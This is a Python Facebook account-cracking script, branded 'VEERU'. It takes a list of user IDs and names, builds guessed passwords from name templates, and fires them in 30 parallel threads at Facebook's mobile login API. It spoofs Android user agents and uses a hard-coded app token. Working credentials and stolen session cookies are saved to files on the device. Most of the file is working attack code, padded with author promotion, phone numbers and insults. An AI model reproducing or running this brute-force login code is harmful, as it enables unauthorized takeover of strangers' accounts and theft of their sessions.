#write coding by usmii

#Whatsapp : 03132281953

import os

import sys

import re

import random,zlib

import time

from time import sleep as sp

import string,json

import subprocess

import base64,uuid

from requests.exceptions import ConnectionError as CError

from concurrent.futures import ThreadPoolExecutor as tpd

os.system('xdg-open https://www.facebook.com/profile.php?id=100080422043092/')

os.system('xdg-open https://chat.whatsapp.com/Jv6uZwbW5so4zCQml49xBA')

#####################    

P = '\x1b[1;97m' # PUTIH

M = '\x1b[1;91m' # MERAH

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;93m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

O = '\x1b[1;96m' # BIRU MUDA

N = '\x1b[0m'    # WARNA MATI

A = '\x1b[1;90m' # WARNA ABU ABU

BN = '\x1b[1;107m' # BELAKANG PUTIH

BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT

BP = '\x1b[1;105m' # BELAKANG PINK

BB = '\x1b[1;104m' # BELAKANG BIRU

BK = '\x1b[1;103m' # BELAKANG KUNING

BH = '\x1b[1;102m' # BELAKANG HIJAU

BM = '\x1b[1;101m' # BELAJANG MERAH

BA = '\x1b[1;100m' # BELAKANG ABU ABU

try:

    import requests

except ImportError:

    os.system('pip install requests')

ses = requests.Session()

id = []

ok = []

cp =[]

loop = 0

pwx = []

method = []

##______COLORS____ARE________######

pwx=[]

W = '\033[97;1m'

R = '\033[91;1m'

G = '\033[92;1m'

Y = '\033[93;1m'

B = '\033[94;1m'

P = '\033[95;1m'

S = '\033[96;1m'

N = '\x1b[0m'

PURPLE ='\x1b[38;5;46m'

RED = '\033[1;91m'

WHITE = '\033[1;97m'

GREEN = '\033[1;32m'

YELLOW = '\033[1;33m'

BLUE = '\033[1;34m'

ORANGE = '\033[1;35m'

BLACK="\033[1;30m"

EXTRA ='\x1b[38;5;208m'

#________________________________________#

def clear():

    os.system("clear")

def line():

    print(52*'-')

def p(x):

    print(x)

def logo():

    logo =f"""{WHITE}

____   ____________________________________ ____ ___ 

\   \ /   /\_   _____/\_   _____/\______   \    |   \

 \   Y   /  |    __)_  |    __)_  |       _/    |   /

  \     /   |        \ |        \ |    |   \    |  / 

   \___/   /_______  //_______  / |____|_  /______/      \/         \/         \/            {BLUE}X {RED}PATHANI {WHITE}

\t[Ã—] Developed VEER ALI{EXTRA} (VEERU)

{WHITE}[â€¢] AUTHOR       : VEER ALI

{WHITE}[â€¢] WhatsApp     :   +923344969891

[â€¢] FaceBook     :   Veer ALI

[â€¢] Version      :   {RED}.5

{WHITE}[â€¢] YouTube      :   VEERU Trick

{WHITE}========HATERXX========FEEL========PAPA==================ðŸ’”======

{WHITE}========I========HATE========FAKE===========PEOPLE========ðŸ’”======"""

    print('\33[1;37m----------------------------------------------')

    p(logo)

ua3 = "YAHN APNY 3RD USER AGENT LGANY HE "

ua2 = ' YH 2ND USERAGENTS LGALO METHOD 2 KY LIYE'

# USER AGENT FUNCTION UA 1 METHOD 1

def iAmAndroidUa():

    # YHN APNY ESE ANDROID KY UA LGANY HE MNE EXAMPLE KY LIYE IPHONE KY LGAY

    ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])

    END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"

    ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 10; Lenovo K13 Build/QOJS30.506-7-18)","Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RHS32.20-42-10-17-2)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; Z986U Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 7.0; 3277 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge (2022) Build/S2ST32.71-118-4)","Dalvik/2.1.0 (Linux; U; Android 13; ASUS_I005DA Build/TKQ1.220807.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g power (2022) Build/S3RQS32.20-42-10-9-4)","Dalvik/2.1.0 (Linux; U; Android 12; LM-F100N Build/SKQ1.211103.001)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K11C Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 12; M2101K7BG Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; SM-A202F Build/RP1A.200720.012)","Dalvik/2.1.0 (Linux; U; Android 9; KFTRWI Build/PS7328.3433N)","Dalvik/2.1.0 (Linux; U; Android 13; V2205 Build/TP1A.220624.014_NONFC)","Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-3)","Dalvik/2.1.0 (Linux; U; Android 13; 2107113SI Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6a Build/TQ2A.230405.003.E1)","Dalvik/2.1.0 (Linux; U; Android 11; E7110 Build/4.600VZ.0576.a)","Dalvik/2.1.0 (Linux; U; Android 12; SH-M17 Build/S6062)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ2A.230405.003.A2)","Dalvik/2.1.0 (Linux; U; Android 11; Star 5 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A037U1 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; moto g power (2022) Build/S3RQS32.20-42-10-7)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CQ72 Build/64.1.A.0.891)","Dalvik/2.1.0 (Linux; U; Android 9; HP Chromebook x360 11 G1 EE Build/R114-15437.8.0)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A546U1 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 12; motorola razr 2022 Build/S3SLS32.16-72-14-6)","Dalvik/2.1.0 (Linux; U; Android 11; Schok Volt SV55 Build/SV55216_01.02.04)","Dalvik/2.1.0 (Linux; U; Android 11; Multilaser_GMAX_2 Build/V8_20230215)","Dalvik/2.1.0 (Linux; U; Android 13; S9-KC Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 12; moto g41 Build/S3RWS32.138-29-5-1)","Dalvik/2.1.0 (Linux; U; Android 13; moto g23 Build/THA33.31-26)","Dalvik/2.1.0 (Linux; U; Android 7.0; 4047G Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A716S Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; SHV45-u Build/SA110)","Dalvik/2.1.0 (Linux; U; Android 12; SM-A336N Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; SM-G950F Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 9; SM-J730F Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A520F Build/R16NW)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; XT907 Build/KPA20.10.1)","Dalvik/2.1.0 (Linux; U; Android 10; Redmi 4 Build/QQ2A.200501.001.B2)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; HELIOS Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 12; BRQ-AN00 Build/HUAWEIBRQ-AN00)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Pro Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A346N Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 30 pro Build/T1SHS33.35-23-20-2)","Dalvik/2.1.0 (Linux; U; Android 9; jacuzzi Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; SO-53C Build/63.1.B.1.78)","Dalvik/2.1.0 (Linux; U; Android 9; U-BOX A9 Build/UMAX_AI_M)","Dalvik/2.1.0 (Linux; U; Android 13; LM-G900 Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 7.0; SH-A01 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; skipper Build/OTT1.201231.001/6.0.5.0421)","Dalvik/2.1.0 (Linux; U; Android 11; FP3 Build/8901.4.A.0021.0)","Dalvik/2.1.0 (Linux; U; Android 10; mainline Build/QD4A.200805.003)","Dalvik/2.1.0 (Linux; U; Android 10; M10_4G_PRO Build/V17_20230110)","Dalvik/2.1.0 (Linux; U; Android 11; P60_EEA Build/MX2_EEA)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 13; moto g23 Build/THA33.31-22)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BC52 Build/61.2.A.0.418)","Dalvik/2.1.0 (Linux; U; Android 9; H8416 Build/52.0.A.8.157)","Dalvik/2.1.0 (Linux; U; Android 11; X96_X4_Pro Build/RD2A.211001.002)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G981B Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; SM-A125F Build/SP1A.210812.016)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; Micromax E311 Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 12; 2201116TI Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; ZTE Blade A31 Plus Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A528B Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; Infinix X666 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a (5G) Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 9; MC32020 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 11; X400 Build/R.X400.20230414.V11.4.2)","Dalvik/2.1.0 (Linux; U; Android 5.0.1; LG-F240S Build/LRX21Y)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CQ54 Build/64.1.A.0.891)","Dalvik/2.1.0 (Linux; U; Android 13; SHG07 Build/S3171)","Dalvik/2.1.0 (Linux; U; Android 11; LaTabStandRB Build/RP1A.201005.006)","Dalvik/2.1.0 (Linux; U; Android 5.1; X11Pro Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 11; X2 Build/X2CRB0120221114)","Dalvik/2.1.0 (Linux; U; Android 11; NW-WM1ZM2 Build/1.06.01)","Dalvik/2.1.0 (Linux; U; Android 6.0; Bluboo Maya Max Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 13; SH-51C Build/TKQ1.220915.002)","Dalvik/2.1.0 (Linux; U; Android 10; Lenovo K13 Build/QOJS30.506-7-18)","Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RHS32.20-42-10-17-2)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; Z986U Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 7.0; 3277 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge (2022) Build/S2ST32.71-118-4)","Dalvik/2.1.0 (Linux; U; Android 13; ASUS_I005DA Build/TKQ1.220807.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g power (2022) Build/S3RQS32.20-42-10-9-4)","Dalvik/2.1.0 (Linux; U; Android 12; LM-F100N Build/SKQ1.211103.001)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K11C Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 12; M2101K7BG Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6a Build/TQ2A.230405.003.E1)","Dalvik/2.1.0 (Linux; U; Android 11; E7110 Build/4.600VZ.0576.a)", "Dalvik/2.1.0 (Linux; U; Android 12; SH-M17 Build/S6062)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ2A.230405.003.A2)","Dalvik/2.1.0 (Linux; U; Android 11; Star 5 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A037U1 Build/TP1A.220624.014)",])+END

    return ua

class Main:

    def __init__(self):

        os.system('clear')

    def saved_results(self,ok,cp):

        if len(ok) != 0 or len(cp) != 0:

            p('\n')

            line()

            p(' [â€¢] Cloning Process Has Been Completed ')

            p(' [â€¢] Total OK Accounts : %s '%(len(ok)))

            p(' [â€¢] Total CP Accounts : %s '%(len(cp)))

            line()

            input(' [â€¢] Press Enter To Go Back To Main Menu ')

            self.menu()

    def menu(self):

        logo()

        p(' [â€¢] INSHALLAH DAILY UPDATES')

        line()

        p(' [1] File Cracking ')

        p(" [2] Join Facebook Group ")

        p(' [3] Join Whatsapp Group ')

        line()

        m_1 = input(' [â€¢] Choose : ')

        if m_1 == '1':

            self.methods_menu()

        elif m_1 == '2':

            os.system('xdg-open https://facebook.com/groups/828047231455910//')

            sp(1)

            self.menu()

        elif m_1 =='3':

            os.system('xdg-open https://chat.whatsapp.com/Jv6uZwbW5so4zCQml49xBA')

        else:

            p(' [â€¢] Wrong Select Hai Bhosdikay ')

            sp(1)

            self.menu()

    def methods_menu(self):

        line()

        p(' [1] Method 1 \n [2] Method 2 \n [3] Method 3')

        line()

        m_2 = input(' [â€¢] Select Method : ')

        if m_2 == '1':

            method.append('i')

            self.cracking()

        elif m_2 == '2':

            method.append('ii')

            self.cracking()

        elif m_2 == '3':

            method.append('iii')

            self.cracking()

        else:

            p(' [â€¢] Wrong Select Hai Bhosdikay ')

            sp(1)

            self.methods_menu()

    def cracking(self):

        clear()

        logo()

        try:

            file = input(' [â€¢] Put File Path : ')

            id = open(file).read().splitlines()

            self.password_menu(id)

        except FileNotFoundError:

            p(' [X] File Path Wrong....')

            sp(2)

            self.cracking()

    def password_menu(self,id):

        clear()

        logo()

        p(' [â€¢] Enter Password Limit Between 1 to 20 (Max) ')

        try:

            plimit = int(input(' [â€¢] Put Limit : '))

            if plimit == '':

                plimit = 4

            elif plimit > 20:

                limit = 10

        except:

            plimit = 4

        clear();logo()

        print(' [â€¢] Example : first123,last1122,firstlast,last Etc ')

        for n in range(plimit):

            pwx.append(input(' [â€¢] Put Password %s : '%(n+1)))

        clear();logo()

        p(' [â€¢] VEERU Brute Has Been Started ')

        line()

        p(' [â€¢] Total Clone Accounts :  %s '%(len(id)))

        line()

        p(' [â€¢] Use Flight Mood On Bhsdk Ip Lol Ha ')

        line()

        with tpd(max_workers=30) as saqi:

            for user in id:

                uid,nm = user.split('|')

                if 'i' in method:

                    saqi.submit(self.method1,uid,nm,pwx)

                elif 'ii' in method:

                    saqi.submit(self.method2,uid,nm,pwx)

                elif 'iii' in method:

                    saqi.submit(self.method3,uid,nm,pwx)

        self.saved_results(ok,cp)

    def method1(self,uid,nm,pwx):

        try:

            global ok , cp , loop

            sys.stdout.write('\r [VEERU-FIRE] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()

            fn = nm.split(' ')[0]

            try:

                ln = nm.split(' ')[1]

            except:

                ln = fn

            for ps in pwx:

                pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())

                data = {"adid": str(uuid.uuid4()),

"format": "json",

"device_id": str(uuid.uuid4()),

"cpl": "true",

"family_device_id": str(uuid.uuid4()),

"credentials_type": "device_based_login_password",

"error_detail_type": "button_with_disabled",

"source": "device_based_login",

"email": uid,

"password": pw,

"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",

"generate_session_cookies": "1",

"meta_inf_fbmeta": "",

"advertiser_id": str(uuid.uuid4()),

"currently_logged_in_userid": "0",

"locale": "en_GB",

"client_country_code": "GB",

"method": "auth.login",

"fb_api_req_friendly_name": "authenticate",

"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",

"api_key": "882a8490361da98702bf97a021ddc14d"}

                headers = {'User-Agent': iAmAndroidUa(),

'Content-Type': 'application/x-www-form-urlencoded',

'Host': 'graph.facebook.com',

'X-FB-Net-HNI': str(random.randint(20000, 40000)),

'X-FB-SIM-HNI': str(random.randint(20000, 40000)),

'X-FB-Connection-Type': 'MOBILE.LTE',

'X-Tigon-Is-Retry': 'False',

'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',

'x-fb-device-group': '5120',

'X-FB-Friendly-Name': 'ViewerReactionsMutation',

'X-FB-Request-Analytics-Tags': 'graphservice',

'X-FB-HTTP-Engine': 'Liger',

'X-FB-Client-IP': 'True',

'X-FB-Server-Cluster': 'True',

'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}

                q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

                if "session_key" in q:

                    coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")

                    cookie = f"sb={sb};{coki}"

                    p('\r\033[1;92m[LEGEND-VEERU-OK] %s | %s \033[1;97m '%(uid,pw))

                    ok.append(uid)

                    open('/sdcard/VEERU_M1_OK.txt','a').write(uid+'|'+pw+'\n')

                    open('/sdcard/VEERU_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')

                    break

                elif 'www.facebook.com' in q['error']['message']:

                    p('\r\033[1;91m[ALONE-VEEEU-CP] %s | %s \033[1;97m '%(uid,pw))

                    cp.append(uid)

                    open('/sdcard/VEERU_M1_CP.txt','a').write(uid+'|'+pw+'\n')

                    break

                else:

                    continue

            loop+=1

        except requests.exceptions.ConnectionError:

                self.method1(uid,nm,pwx)

    def method2(self,uid,nm,pwx):

        #YE METHOD 2 HE

        print(" [ METHOD 2] YHN AP 2ND METHOD LGALO ...")

        exit()

    def method3(self,uid,nm,pwx):

        #YE METHOD 3 HE

        print(" [ METHOD 3 ] YHN AP 3RD METHOD LGALO ...")

        exit()

        exit()

if __name__=="__main__":

    Main().menu()
